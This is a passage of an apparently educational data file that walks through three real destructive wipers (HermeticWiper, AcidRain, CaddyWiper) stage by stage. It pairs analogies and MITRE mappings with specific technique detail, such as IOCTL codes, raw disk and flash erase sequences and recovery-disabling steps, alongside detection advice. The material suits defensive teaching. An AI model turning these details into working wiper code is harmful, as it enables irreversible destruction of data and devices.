        'Sandworm (GRU Unit 74455) deploys HermeticWiper (FoxBlade), extracting a legitimate signed EaseUS Partition Master driver (empntdrv.sys) from its PE RCDATA resource section to gain raw disk access and overwrite the MBR, NTFS boot sectors, $MFT, and $LogFile (AA22-057A).',
      storyAnalogy:
        'Imagine a saboteur disguised with a genuine business license (`Hermetica Digital Ltd`) who wants to demolish a library’s card catalog (`$MFT`) and front entrance (`MBR`) so not a single book can ever be found again. Because the library’s operating system guards the master card catalog, the saboteur unpacks a genuine, licensed bulldozer (`Signed EaseUS Partition Master Driver empntdrv.sys`) from their suitcase, drives it straight into the foundation, shreds the master index with random noise, and pulls the main power plug.',
      plainSummary:
        'Discovered by ESET and analyzed by SentinelOne and CISA (AA22-057A / MAR-10375867-1) on February 23, 2022, HermeticWiper (`FoxBlade`) is a destructive wiper deployed by Russia’s GRU Sandworm group against Ukrainian ministries and financial institutions. Signed with a code-signing certificate issued to `Hermetica Digital Ltd`, the binary carries compressed 32/64-bit copies of the legitimate, Microsoft-signed EaseUS Partition Master kernel driver (`empntdrv.sys`) in its `RCDATA` resource section. It loads the driver, disables Volume Shadow Copies and crash dumps, and uses `CryptGenRandom` to overwrite the Master Boot Record (`MBR`), partition tables, and NTFS metadata (`$MFT`, `$LogFile`, `$Bitmap`) across `\\\\.\\PhysicalDrive0..100` before forcing a reboot.',
      diagramTopologySummary:
        'Sandworm GPO / WMI Deployment -> HermeticWiper (conhost.dll / Hermetica) -> Signed EaseUS Driver (empntdrv.sys) -> PhysicalDrive0 MBR & NTFS $MFT Wiped -> ESET / SentinelOne / CISA MAR Sensor.',
      documentedAdvisory:
        'CISA Alert AA22-057A & MAR-10375867-1 (HermeticWiper) / ESET & SentinelLabs Technical Analysis',
    },
    steps: [
      {
        stepNumber: 1,
        plainTitle: 'Extracting & Registering Signed EaseUS Driver (empntdrv.sys) from RCDATA',
        technicalTitle: 'Stage 1: Extracting & Registering Signed EaseUS Driver (empntdrv.sys) from RCDATA',
        mitreTactic: 'Privilege Escalation & Defense Evasion (T1068 / T1543.003)',
        storyAnalogy:
          'To bypass Windows protections on active disk partitions, the wiper unpacks a genuine, Microsoft-signed disk-partitioning driver hidden inside its own resource pocket.',
        simpleExplanation:
          'Upon execution via Active Directory GPO or WMI, HermeticWiper enabled `SeLoadDriverPrivilege`, `SeBackupPrivilege`, and `SeShutdownPrivilege` in its process token, checked the OS architecture and Windows version, decompressed an `MSZIP`-compressed resource (`DRV_X64` / `DRV_XP_X64`) from its PE `RCDATA` section into `C:\\Windows\\System32\\drivers\\<2_random_chars>dr.sys` (a legitimate, Microsoft-signed copy of `empntdrv.sys` from EaseUS Partition Master), and loaded it into the kernel.',
        howItWorksInPractice:
          'Both the outer HermeticWiper executable (signed by `Hermetica Digital Ltd` until revoked) and the inner `empntdrv.sys` kernel driver (signed by `CHENGDU YIWO Tech Development Co., Ltd.`) carried valid Authenticode signatures at the time of the attack.',
        diagramAlignment:
          'Vector #1.1 links the Sandworm GPO Deployment and HermeticWiper binary to the Signed EaseUS Driver (`empntdrv.sys`).',
        detectionAndEvidence:
          'Sysmon EventID 6 (`DriverLoaded`) for `empntdrv.sys` or `C:\\Windows\\System32\\drivers\\??dr.sys` signed by `CHENGDU YIWO Tech Development Co., Ltd.`.',
      },
      {
        stepNumber: 2,
        plainTitle: 'Disabling Volume Shadow Copy (vss), Crash Dumps & Fragmenting NTFS Metadata',
        technicalTitle: 'Stage 2: Disabling Volume Shadow Copy (vss), Crash Dumps & Fragmenting NTFS Metadata',
        mitreTactic: 'Inhibit System Recovery & Defense Evasion (T1490 / T1070)',
        storyAnalogy:
          'Before destroying the master index, the saboteur turns off the backup camera (`vss`), disables the black-box flight recorder (`CrashControl`), and maps out every page of the NTFS file table.',
        simpleExplanation:
          'HermeticWiper called `ChangeServiceConfigW` and `ControlService` to disable and stop the `vss` (Volume Shadow Copy) service, set `HKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl\\CrashDumpEnabled = 0` (preventing Windows from writing a `MEMORY.DMP` kernel crash dump when the corrupted system inevitably blue-screened, thereby denying incident responders RAM forensics), and parsed the raw NTFS boot sector and Master File Table (`$MFT`) to map the exact physical disk runlists of `$MFT`, `$LogFile`, `$Bitmap`, and `C:\\Windows\\System32\\config` registry hives.',
        howItWorksInPractice:
          'By parsing the NTFS `$MFT` runlist fragments directly rather than using standard Windows file APIs, HermeticWiper could corrupt the exact physical sectors backing critical OS metadata even while Windows held those files locked.',
        diagramAlignment:
          'Vector #2.1 connects the Signed EaseUS Driver to the ESET / SentinelOne / CISA MAR Sensor as `vss` and `CrashControl` are disabled.',
        detectionAndEvidence:
          'Windows System EventID 7040 (`vss` service disabled) and Registry EventID 13 (`CrashControl\\CrashDumpEnabled` set to `0`).',
      },
      {
        stepNumber: 3,
        plainTitle: 'Raw \\\\.\\PhysicalDrive0..100 MBR & NTFS $MFT Overwrite with CSPRNG Bytes',
        technicalTitle: 'Stage 3: Raw \\\\.\\PhysicalDrive0..100 MBR & NTFS $MFT Overwrite with CSPRNG Bytes',
        mitreTactic: 'Impact (T1561.002 - Disk Structure Wipe)',
        storyAnalogy:
          'Finally, the wiper overwrites the front door (`MBR`) and the master card catalog (`$MFT`) of every hard drive with cryptographic noise and forces an immediate reboot.',
        simpleExplanation:
          'Iterating through `\\\\.\\PhysicalDrive0` up to `\\\\.\\PhysicalDrive100`, HermeticWiper generated cryptographically random bytes via `CryptGenRandom` and overwrote the `Master Boot Record (MBR)` (first 512 bytes of sector 0), GPT partition headers, and the mapped physical sector extents of `$MFT`, `$LogFile`, and `C:\\Users`, before invoking `ExitWindowsEx(EWX_REBOOT | EWX_FORCE)` to immediately reboot the machine into an unrecoverable, unbootable state.',
        howItWorksInPractice:
          'Because the `$MFT` (which maps where every file resides on an NTFS volume) and `$MFTMirr` are overwritten with random bytes from `CryptGenRandom`, carving or recovering filesystem structure is rendered impossible in seconds without having to overwrite every gigabyte of the disk.',
        diagramAlignment:
          'Vector #3.1 traces the EaseUS driver and HermeticWiper overwriting `PhysicalDrive0 MBR & NTFS $MFT Wiped`.',
        detectionAndEvidence:
          'Blocking `empntdrv.sys` via WDAC and behavioral EDR prevention blocking raw `WriteFile` operations to sector 0 of `\\\\.\\PhysicalDrive*`.',
      },
    ],
  },
  'acidrain-viasat-ka-sat-modem-wiper': {
    scenarioId: 'acidrain-viasat-ka-sat-modem-wiper',
    briefing: {
      headline:
        'Pushed via the TR-069 management plane during the February 2022 Viasat KA-SAT cyberattack, the AcidRain 32-bit MIPS ELF wiper bricks tens of thousands of SurfBeam2 satellite modems by issuing MEMUNLOCK, MEMERASE, and MEMWRITEOOB IOCTLs against /dev/mtd* SPI flash memory.',
      storyAnalogy:
        'Imagine 40,000 remote satellite dishes across Europe that all listen to a single central control tower (`TR-069 ACS`) for automatic software updates. Saboteurs break into the control tower and broadcast a tiny self-destruct program (`AcidRain / ukrop`) that tells every satellite modem not just to delete its files, but to use a blowtorch (`MEMERASE` / `MEMWRITEOOB` IOCTLs) to melt the permanent flash memory chip (`/dev/mtd*`) holding its startup brain, turning the hardware into a dead brick.',
      plainSummary:
        'Reverse-engineered by SentinelOne (SentinelLabs) in March 2022 and addressed in joint CISA/NSA/FBI SATCOM advisories, AcidRain (`ukrop`) is a 32-bit big-endian MIPS ELF wiper deployed by Russian GRU threat actors against Viasat’s KA-SAT network on February 24, 2022. Pushed over the legitimate TR-069 CWMP management channel to over 40,000 SurfBeam2 satellite modems (knocking out Ukrainian communications and 5,800 German wind turbines), AcidRain exhaustively iterates Linux block devices (`/dev/sd*`, `/dev/mmcblk*`) and raw Memory Technology Devices (`/dev/mtd0..99`), issuing `MEMUNLOCK`, `MEMERASE`, and `MEMWRITEOOB` IOCTLs to permanently erase the onboard SPI NOR/NAND flash.',
      diagramTopologySummary:
        'Compromised SATCOM TR-069 ACS Server -> KA-SAT SurfBeam2 Modem (ukrop ELF) -> Linux MTD Subsystem (/dev/mtd0..99) -> Bricked SPI NOR/NAND Flash & Turbines -> SentinelOne / Viasat SATCOM Telemetry.',
      documentedAdvisory:
        'SentinelLabs AcidRain: A Modem Wiper Rains Down on Europe / Viasat KA-SAT Incident Report / CISA & NSA SATCOM Advisory AA22-076A',
    },
    steps: [
      {
        stepNumber: 1,
        plainTitle: 'Management Plane Compromise & TR-069 CWMP Push of MIPS ELF Binary (ukrop)',
        technicalTitle: 'Stage 1: Management Plane Compromise & TR-069 CWMP Push of MIPS ELF Binary (ukrop)',
        mitreTactic: 'Initial Access & Execution (T1199 - Trusted Relationship / TR-069 Management Plane)',
        storyAnalogy:
          'Rather than hacking 40,000 modems over the air one by one, the attackers hijack the central ground station that every modem trusts for remote management commands.',
        simpleExplanation:
          'After exploiting a VPN misconfiguration to enter the trusted management segment of the Viasat KA-SAT ground network, the threat actors issued mass management commands over the `TR-069 (CWMP)` protocol to deliver and execute a 140KB statically linked 32-bit MIPS ELF binary named `ukrop` (`AcidRain`) across tens of thousands of online `SurfBeam2` satellite modems.',
        howItWorksInPractice:
          'Because `ukrop` had zero external library dependencies and brute-forced every conceivable Linux storage device path, it served as a universal embedded Linux/router/modem wiper.',
        diagramAlignment:
          'Vector #1.1 links the Compromised SATCOM TR-069 ACS Server to the KA-SAT SurfBeam2 Modem (`ukrop ELF`).',
        detectionAndEvidence:
          'SATCOM management plane anomaly detection flagging mass TR-069 `Download` / command pushes and unsigned ELF execution in `/tmp`.',
      },
      {
        stepNumber: 2,
        plainTitle: 'Block Device Enumeration (/dev/sda, /dev/mmcblk) & Sequential Overwrite',
        technicalTitle: 'Stage 2: Block Device Enumeration (/dev/sda, /dev/mmcblk) & Sequential Overwrite',
        mitreTactic: 'Impact (T1561.002 - Disk Structure Wipe)',
        storyAnalogy:
          'First, the wiper walks through every possible hard drive, SD card, and flash partition name in the Linux dictionary and scrambles their contents.',
        simpleExplanation:
          'Forking into the background as `root` (`UID 0`), AcidRain first recursively overwrote files across non-essential filesystem directories, then systematically generated device paths for `/dev/sda`..`/dev/sdz`, `/dev/hda`..`/dev/hdz`, `/dev/mmcblk0`..`/dev/mmcblk9`, and `/dev/mtdblock0`..`/dev/mtdblock99` (overwriting the first 384KB of each device and issuing `BLKDISCARD`, `BLKSECDISCARD`, and `BLKZEROOUT` kernel IOCTLs to erase storage blocks).',
        howItWorksInPractice:
          'By brute-forcing hundreds of device node names in a loop, AcidRain did not need to parse `/proc/partitions` or `sysfs` and worked across any embedded Linux distribution.',
        diagramAlignment:
          'Vector #2.1 connects the SurfBeam2 Modem (`ukrop ELF`) to the Linux MTD & Block Subsystem and triggers the SentinelOne / Viasat SATCOM Telemetry sensor.',
        detectionAndEvidence:
          'Embedded Linux syscall monitoring for processes opening `/dev/mtdblock*` or `/dev/mmcblk*` with `O_WRONLY`/`O_RDWR` outside legitimate firmware upgrade daemons.',
      },
      {
        stepNumber: 3,
        plainTitle: 'Raw SPI Flash /dev/mtd0..99 Destruction via MEMUNLOCK, MEMERASE & MEMWRITEOOB',
        technicalTitle: 'Stage 3: Raw SPI Flash /dev/mtd0..99 Destruction via MEMUNLOCK, MEMERASE & MEMWRITEOOB',
        mitreTactic: 'Impact (T1495 - Firmware Corruption / T1561.001)',
        storyAnalogy:
          'Finally, the wiper unlocks the raw silicon flash chip holding the modem’s bootloader (`U-Boot`), erases every sector, and reboots—leaving the modem unable to ever turn back on.',
        simpleExplanation:
          'For character-mode flash devices `/dev/mtd0` through `/dev/mtd99`, AcidRain queried flash geometry via `MEMGETINFO` and then looped through every eraseblock issuing `ioctl(fd, MEMUNLOCK)` (unlocking software-protected flash sectors), `ioctl(fd, MEMERASE)` (physically erasing NOR/NAND flash blocks to `0xFF`), and `ioctl(fd, MEMWRITEOOB)` (corrupting NAND flash Out-Of-Band ECC metadata), before invoking `reboot(RB_AUTOBOOT)` to permanently brick the modem.',
        howItWorksInPractice:
          'Because `/dev/mtd0` holds the primary `U-Boot` bootloader on embedded MIPS routers and satellite modems, erasing `/dev/mtd0` rendered the modems physically unbootable and required physical hardware replacement or JTAG/SPI chip reflashing.',
        diagramAlignment:
          'Vector #3.1 traces the Linux MTD Subsystem (`/dev/mtd0..99`) executing `MEMERASE` to leave Bricked SPI NOR/NAND Flash & Turbines.',
        detectionAndEvidence:
          'Hardware write-protect strapping (`WP#` pin grounded) on bootloader SPI NOR flash regions so software `MEMUNLOCK`/`MEMERASE` IOCTLs are rejected by the flash chip hardware.',
      },
    ],
  },
  'caddywiper-arguepatch-gpo-destruction': {
    scenarioId: 'caddywiper-arguepatch-gpo-destruction',
    briefing: {
      headline:
        'Sandworm deploys CaddyWiper via Active Directory GPO and the ArguePatch loader (patched IDA win32_remote.exe), calling DsRoleGetPrimaryDomainInformation to intentionally spare Domain Controllers while zeroing out C:\\Users and \\\\.\\PhysicalDrive* partition layouts via IOCTL 0x0007C054.',
      storyAnalogy:
        'Imagine an army of demolition robots dispatched from a central radio tower (`Primary Domain Controller`) to tear down every building in a compound. If the first robot to wake up accidentally demolishes the central radio tower itself, none of the remaining buildings will ever receive the demolition signal! So the robot’s first instruction (`DsRoleGetPrimaryDomainInformation`) is: "Check if I am standing inside the central radio tower. If yes, go to sleep immediately; if no, erase every room and smash the foundation."',
      plainSummary:
        'Analyzed by ESET, Cisco Talos, and CERT-UA in March–April 2022 during Sandworm attacks against Ukrainian financial and energy organizations (including alongside Industroyer2), CaddyWiper is a compact 9KB C++ destructive wiper often loaded in memory by `ArguePatch` (a patched version of Hex-Rays IDA Pro’s signed/legitimate `win32_remote.exe` debugger server). Pushed via Active Directory GPO Scheduled Tasks, CaddyWiper first calls `DsRoleGetPrimaryDomainInformation` and exits immediately if running on a Primary Domain Controller (`DsRole_RolePrimaryDomainController`), then recursively zeroes out `C:\\Users` and drives `D:`..`Z:` before wiping disk partition tables on `\\\\.\\PhysicalDrive9..0` via `IOCTL_DISK_SET_DRIVE_LAYOUT_EX` (`0x0007C054`).',
      diagramTopologySummary:
        'Sandworm GPO Scheduled Task Push -> ArguePatch Loader (Patched win32_remote.exe) -> CaddyWiper (DsRole Domain Controller Check) -> IOCTL_DISK_SET_DRIVE_LAYOUT_EX Zeroing -> ESET / Cisco Talos / CERT-UA Sensor.',
      documentedAdvisory:
        'ESET CaddyWiper & ArguePatch Technical Analysis / Cisco Talos CaddyWiper Report / CERT-UA#4195 & MITRE S0693',
    },
    steps: [
      {
        stepNumber: 1,
        plainTitle: 'GPO Mass Deployment & ArguePatch Patched Debugger Loader Execution',
        technicalTitle: 'Stage 1: GPO Mass Deployment & ArguePatch Patched Debugger Loader Execution',
        mitreTactic: 'Execution & Defense Evasion (T1053.005 - Scheduled Task / T1574)',
        storyAnalogy:
          'Using the company’s own Group Policy loudspeaker, the attacker pushes out a legitimate-looking programmer’s debugging tool (`win32_remote.exe`) whose startup code has been secretly rewired to unpack a wiper in RAM.',
        simpleExplanation:
          'From a compromised Domain Controller, Sandworm staged payloads in `SYSVOL` and pushed an Active Directory Group Policy Scheduled Task to execute `CaddyWiper` either directly (`caddy.exe`) or wrapped inside `ArguePatch` (a modified copy of Hex-Rays IDA Pro’s legitimate `win32_remote.exe` binary where Sandworm patched a single internal function to read, XOR-decrypt, and execute encrypted `CaddyWiper` shellcode directly in memory).',
        howItWorksInPractice:
          'Sandworm reused the exact same `ArguePatch` loader weeks later during the April 2022 electrical substation attack (`Industroyer2`) to schedule timed destruction of Windows servers.',
        diagramAlignment:
          'Vector #1.1 links the Sandworm GPO Scheduled Task Push to the `ArguePatch` Loader (`Patched win32_remote.exe`).',
        detectionAndEvidence:
          'Sysmon EventID 1 for `win32_remote.exe` or `caddy.exe` spawned by the Task Scheduler (`svchost.exe -k netsvcs -p -s Schedule`) from `C:\\Users\\Public` or `SYSVOL`.',
      },
      {
        stepNumber: 2,
        plainTitle: 'DsRoleGetPrimaryDomainInformation Check to Spare Domain Controllers',
        technicalTitle: 'Stage 2: DsRoleGetPrimaryDomainInformation Check to Spare Domain Controllers',
        mitreTactic: 'Discovery & Execution Guardrails (T1082 / T1480 - Execution Guardrails)',
        storyAnalogy:
          'Before lighting the fuse, the wiper checks the machine’s job title—and if the machine is the Primary Domain Controller, the wiper walks away so the Domain Controller stays alive to infect everyone else.',
        simpleExplanation:
          'Resolving API names dynamically on the stack to hide its Import Address Table (`IAT`), CaddyWiper’s very first action was calling `DsRoleGetPrimaryDomainInformation(NULL, DsRolePrimaryDomainInfoBasic, &pInfo)` from `netapi32.dll` (checking whether `pInfo->MachineRole == DsRole_RolePrimaryDomainController` [value `5`], and immediately terminating itself without wiping anything if running on a Primary Domain Controller so Sandworm retained its Active Directory foothold and GPO distribution server).',
        howItWorksInPractice:
          'This execution guardrail explains why responders during a CaddyWiper incident often found member workstations and application servers completely bricked while the Primary Domain Controller remained up and actively pushing the malicious GPO.',
        diagramAlignment:
          'Vector #2.1 connects the `ArguePatch` Loader to the CaddyWiper (`DsRole Domain Controller Check`) node and triggers the ESET / Cisco Talos / CERT-UA Sensor.',
        detectionAndEvidence:
          'Behavioral sandboxes and EDR sensors detecting stack-constructed strings for `DsRoleGetPrimaryDomainInformation`, `SeTakeOwnershipPrivilege`, and `PhysicalDrive` inside `win32_remote.exe`.',
      },
      {
        stepNumber: 3,
        plainTitle: 'TakeOwnership Recursive File Zeroing & IOCTL_DISK_SET_DRIVE_LAYOUT_EX Wipe',
        technicalTitle: 'Stage 3: TakeOwnership Recursive File Zeroing & IOCTL_DISK_SET_DRIVE_LAYOUT_EX Wipe',
        mitreTactic: 'Impact (T1561.001 - Disk Content Wipe / T1561.002 - Disk Structure Wipe)',
        storyAnalogy:
          'On every non-DC computer, the wiper legally transfers ownership of every file to itself, overwrites them with zeros, and then sends a single disk-layout command that erases the drive’s partition map.',
        simpleExplanation:
          'On member workstations and servers, CaddyWiper enabled `SeTakeOwnershipPrivilege`, recursively walked `C:\\Users` and all drives from `D:\\` to `Z:\\` calling `SetNamedSecurityInfoA` (transferring file ownership and DACLs to the current user before overwriting every file’s contents with `0x00` null bytes), and finally looped from `\\\\.\\PhysicalDrive9` down to `\\\\.\\PhysicalDrive0` issuing `DeviceIoControl` with `IOCTL_DISK_SET_DRIVE_LAYOUT_EX` (`0x0007C054` passing a 1,920-byte zero-filled `DRIVE_LAYOUT_INFORMATION_EX` structure that instructs the Windows disk driver itself to erase the MBR/GPT partition tables).',
        howItWorksInPractice:
          'By abusing the legitimate Windows kernel disk IOCTL `IOCTL_DISK_SET_DRIVE_LAYOUT_EX` (`0x0007C054`) rather than bringing a third-party kernel driver, CaddyWiper destroyed the disk partition table without needing a BYOVD driver.',
        diagramAlignment:
          'Vector #3.1 traces the CaddyWiper check proceeding into `IOCTL_DISK_SET_DRIVE_LAYOUT_EX` Zeroing on member hosts.',
        detectionAndEvidence:
          'EDR kernel filter blocking `IOCTL_DISK_SET_DRIVE_LAYOUT_EX` (`0x0007C054`) with zeroed partition entries and alerting on rapid `SetNamedSecurityInfoA` ownership takeovers across `C:\\Users`.',
      },
    ],
  },
};
